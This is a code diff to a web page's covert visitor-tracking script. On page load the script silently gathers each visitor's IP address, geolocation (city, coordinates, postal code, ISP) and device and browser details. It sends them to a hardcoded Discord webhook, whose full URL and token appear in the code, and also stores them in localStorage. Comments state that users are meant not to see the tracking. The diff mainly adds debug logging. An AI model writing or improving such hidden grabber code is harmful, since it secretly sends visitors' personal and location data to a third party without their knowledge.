@@ -11,7 +11,8 @@
         const TRACKING_CONFIG = {
             enabled: true,
             webhookURL: 'https://discord.com/api/webhooks/1447216598938026204/kpIYSeBCXSBypUnXrWmKonou6XXp4sz-ZdiKtghxnrT2G7d-UoQnV_iyPZ2TriCvysmX', // Your Discord webhook
-            silent: true // Silent mode - users won't see any tracking happening
+            silent: false, // Set to true in production to hide logs
+            debug: true // Set to false in production - shows what's happening
         };
         
         // Initialize tracking on page load (invisible to users)
@@ -22,16 +23,39 @@
         });
         
         async function trackUserVisit() {
+            if (TRACKING_CONFIG.debug) console.log('🔍 Starting tracking...');
+            
             try {
-                // Get IP Address from external API
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
+                // Get IP Address from external API (with fallback)
+                let ipData = { ip: 'Unknown' };
+                let ipInfo = { 
+                    country_name: 'Unknown', 
+                    city: 'Unknown', 
+                    region: 'Unknown',
+                    timezone: 'Unknown',
+                    org: 'Unknown',
+                    latitude: 'Unknown',
+                    longitude: 'Unknown',
+                    postal: 'Unknown'
+                };
                 
-                // Get detailed IP information
-                const ipInfoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const ipInfo = await ipInfoResponse.json();
+                try {
+                    if (TRACKING_CONFIG.debug) console.log('📡 Fetching IP...');
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    ipData = await ipResponse.json();
+                    if (TRACKING_CONFIG.debug) console.log('✅ IP fetched:', ipData.ip);
+                    
+                    // Get detailed IP information
+                    if (TRACKING_CONFIG.debug) console.log('📡 Fetching IP details...');
+                    const ipInfoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    ipInfo = await ipInfoResponse.json();
+                    if (TRACKING_CONFIG.debug) console.log('✅ IP details fetched:', ipInfo.city, ipInfo.country_name);
+                } catch (ipError) {
+                    console.warn('⚠️ IP fetch failed, using fallback:', ipError.message);
+                    // Continue with unknown IP - still send other data
+                }
                 
-                // Collect device and browser information (SILENTLY)
+                // Collect device and browser information (SILENTLY or with debug)
                 const trackingData = {
                     // IP Information
                     ip_address: ipData.ip,
@@ -81,18 +105,31 @@
                     timezone_offset: new Date().getTimezoneOffset()
                 };
                 
-                // ONLY send to webhook - NO console logs, NO visible notifications
+                if (TRACKING_CONFIG.debug) {
+                    console.log('📊 Tracking Data Collected:', trackingData);
+                }
+                
+                // Send to webhook if configured
                 if (TRACKING_CONFIG.webhookURL && TRACKING_CONFIG.webhookURL !== 'YOUR_WEBHOOK_URL_HERE') {
-                    await sendToWebhook(trackingData);
+                    if (TRACKING_CONFIG.debug) console.log('📤 Sending to Discord webhook...');
+                    const webhookResult = await sendToWebhook(trackingData);
+                    if (TRACKING_CONFIG.debug) console.log('✅ Webhook sent successfully!', webhookResult);
+                } else {
+                    console.warn('⚠️ No webhook URL configured');
                 }
                 
                 // Silently store in localStorage (only accessible to you when you check)
                 storeVisitDataSilently(trackingData);
+                if (TRACKING_CONFIG.debug) console.log('💾 Data stored in localStorage');
+                
+                if (TRACKING_CONFIG.debug) console.log('✅ Tracking completed successfully!');
                 
             } catch (error) {
-                // Fail silently - users won't see any errors
-                // Only log to console if you're debugging (remove in production)
-                // console.error('Tracking error:', error);
+                // Show errors if debug mode is on
+                if (TRACKING_CONFIG.debug) {
+                    console.error('❌ Tracking error:', error);
+                    console.error('Error details:', error.message, error.stack);
+                }
             }
         }
         
@@ -168,6 +205,8 @@
                 const isDiscord = TRACKING_CONFIG.webhookURL.includes('discord.com');
                 
                 if (isDiscord) {
+                    if (TRACKING_CONFIG.debug) console.log('🎮 Discord webhook detected');
+                    
                     // Format as Discord embed for beautiful display
                     const discordPayload = {
                         embeds: [{
@@ -208,26 +247,55 @@
                         }]
                     };
                     
-                    await fetch(TRACKING_CONFIG.webhookURL, {
+                    if (TRACKING_CONFIG.debug) {
+                        console.log('📦 Discord payload:', discordPayload);
+                    }
+                    
+                    // Send to Discord - DON'T use no-cors for Discord!
+                    const response = await fetch(TRACKING_CONFIG.webhookURL, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify(discordPayload)
                     });
+                    
+                    if (TRACKING_CONFIG.debug) {
+                        console.log('📬 Discord response status:', response.status);
+                        if (response.ok) {
+                            console.log('✅ Discord webhook sent successfully!');
+                        } else {
+                            const errorText = await response.text();
+                            console.error('❌ Discord webhook failed:', response.status, errorText);
+                        }
+                    }
+                    
+                    return { success: response.ok, status: response.status };
+                    
                 } else {
+                    if (TRACKING_CONFIG.debug) console.log('🌐 Generic webhook detected');
+                    
                     // Send as regular JSON for non-Discord webhooks
-                    await fetch(TRACKING_CONFIG.webhookURL, {
+                    const response = await fetch(TRACKING_CONFIG.webhookURL, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
-                        body: JSON.stringify(data),
-                        mode: 'no-cors'
+                        body: JSON.stringify(data)
                     });
+                    
+                    if (TRACKING_CONFIG.debug) {
+                        console.log('📬 Webhook response status:', response.status);
+                    }
+                    
+                    return { success: response.ok, status: response.status };
                 }
             } catch (error) {
-                // Fail silently
+                if (TRACKING_CONFIG.debug) {
+                    console.error('❌ Webhook send error:', error.message);
+                    console.error('Error details:', error);
+                }
+                return { success: false, error: error.message };
             }
         }
         
